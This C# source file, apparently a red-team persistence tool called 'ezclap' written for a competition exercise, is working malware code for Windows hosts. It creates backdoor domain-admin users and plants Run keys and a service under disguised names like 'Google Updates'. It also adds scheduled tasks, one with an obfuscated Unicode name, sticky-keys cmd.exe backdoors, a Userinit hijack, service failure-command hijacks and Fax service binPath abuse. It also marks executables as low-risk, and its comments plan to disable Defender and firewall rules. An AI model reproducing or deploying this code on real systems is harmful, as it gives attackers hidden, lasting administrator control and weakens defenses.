using System;
using System.Data;
using System.DirectoryServices;
using System.Collections.Generic;
using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;



namespace ezclap
{
    class Program
    {
        // Something to parse a yaml file and feed all the configuration into the persistence in main function 


        public static void modifyFaxService(string payload)
        {
            string arguments = "config Fax " + " binPath= \"cmd.exe /c " + payload + "\" start=\"auto\" obj=\"LocalSystem\" ";
            System.Diagnostics.Process.Start(@"C:\Windows\System32\sc.exe", arguments);
        }

        public static void modifyFailureService(List<string> services, string payload)
        {
            foreach (string service in services)
            {
                string argument = "/C sc failure " + service + " reset= 10 actions= run/5000//// command= \"" + payload + "\" ";
                System.Diagnostics.Process.Start(@"C:\Windows\System32\cmd.exe", argument);
            }
        }

        public static void modifyImageFileExec(string payload)
        {

            RegistryKey imageFileExecKey = Registry.LocalMachine.OpenSubKey(RegistryKeys.hklmImageFileExec);
            string[] targetExec = new string[] { "notepad.exe", "taskmgr.exe" };
            foreach (string target in targetExec)
            {
                string finalImageFileExec = RegistryKeys.hklmImageFileExec + "\\" + target;
                Utils.setHKLMSubKey(finalImageFileExec, "GlobalFlag", 512);

                string finalSilentProcExit = RegistryKeys.hklmSilentProcessExit + "\\" + target;
                Utils.setHKLMSubKey(finalSilentProcExit, "ReportingMode", 1);
                Utils.setHKLMSubKey(finalSilentProcExit, "MonitorProcess", payload);

            }
            /*  This is way too destructive and have a chance to bomb the box. Removing for now... 
            foreach (var v in imageFileExecKey.GetSubKeyNames() ) 
            {
                try{
                    string finalLocation = RegistryKeys.hklmImageFileExec + "\\" + v;
                    setHKLMSubKey(finalLocation, "GlobalFlag", 512);

                    string silentProcesExitFinal = RegistryKeys.hklmSilentProcessExit + "\\" + v;
                    setHKLMSubKey(silentProcesExitFinal, "ReportingMode", 1);
                    setHKLMSubKey(silentProcesExitFinal, "MonitorProcess", payload);
                }
                catch(Exception e){
                    continue;
                } 
            }
            */
        }

        static void Main(string[] args)
        {


            //string[] domainAdmins = new string[] { "joe", "bob", "michael", "whiteteamer", "blackteamer", "scoringengine" };
            //string[] randomUsers = new string[] { "father", "son", "cattails", "watershell", "headshot", "detcord", "silenttrinity" };
            // =================================================================================================================

            string[] users = new string[] { "bob", "doe" };
            string[] groups = new string[] { "Domain Admins", "Administrators", "Enterprise Admins" };
            string password = "Password123!";
            string payload = "c:\\Users\\Administrator\\Desktop\\agent.exe";

            /*
             *  0. Setup 
             *      A) LowRiskFileTypes --> bypass bat, exe, ps1 
             *      B) Turn off windows defender completely --> Ask blackteam/redteam about if this is even needed 
             *      C) Enable PSremoting, Winrm (?) 
             *      D) Drop all firewall rules 
             */


            Utils.setHKCUSubKey(RegistryKeys.hkcuLowRiskFileType, "LowRiskFileTypes", ".bat;.exe;.ps1");
            Console.WriteLine(RegistryKeys.hklmImagePath);

            // 0. Dropping payload, changing it to random names, timestomping, etc...

            // 1. Create Backdoor users 
            AddUser persistAddUser = new AddUser(users, password, groups);

            
            // 2. Create Runkey registry with payloads 
            string[] names = new string[] { "ApplicationSecurity", "Backup", "Appsec", "Google Updates", "Microsoft_Credential_Guard", "duderino", "catchmeifyoucan" };
            AddRunKey persistAddRunKey = new AddRunKey(names, payload);
            
            
            // 3. Create a malicious service --> Through sc? Or actually through installer route? 
            string easyServiceName = "ApplicationSecurity";
            AddService easyService = new AddService(easyServiceName, payload);
            easyService.StartService(easyServiceName, 10000);

            
            // 4. Create scheduled task - Runs every 20 minutes 
            string scheduledTaskName = "GoogleUpdateTaskMachineMaster";
            string unicodeScheduledTaskName = "樂𐐷𐐷𐐷𐐷𐐷𐐷쀍승관𤭢𤭢𤭢𤭢𤭢𤭢𤭢𤭢𤭢𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𤭢𤭢𤭢𤭢𤭢𤭢𤭢樂쳌쳌쳌쳌쀍";
            AddScheduledTask task1 = new AddScheduledTask(scheduledTaskName, payload, 20.0);
            AddScheduledTask task2 = new AddScheduledTask(unicodeScheduledTaskName, payload, 20.0);

            // 5. Create startup folder persistence 

            // 6. Create utilman and sceth (sticky) persistence 
            string accessbilityPayload = "C:\\Windows\\System32\\cmd.exe";
            AddAccessibility persistAccess = new AddAccessibility(accessbilityPayload);

            
            // 7. Modify userinit 
            Utils.setHKLMSubKey(RegistryKeys.hklmUserInit, "Userinit", payload + ", C:\\Windows\\System32\\userinit.exe");

            /*

            // 8. Modify ImagePath - TODO: Implement this 
            setHKLMSubKey(RegistryKeys.hklmImagePath, "ImagePath", payload);
            */

            // 9. Modify FailureCommand 
            List<string> servicesList = new List<string>();
            servicesList = Utils.getAllServices();
            AddFailureCommand persistFailureCommand = new AddFailureCommand(servicesList, payload);
            
            // 10. Modify Image File Execution             
            //modifyImageFileExec(payload);

            

            Console.ReadLine();
        }
    }
}
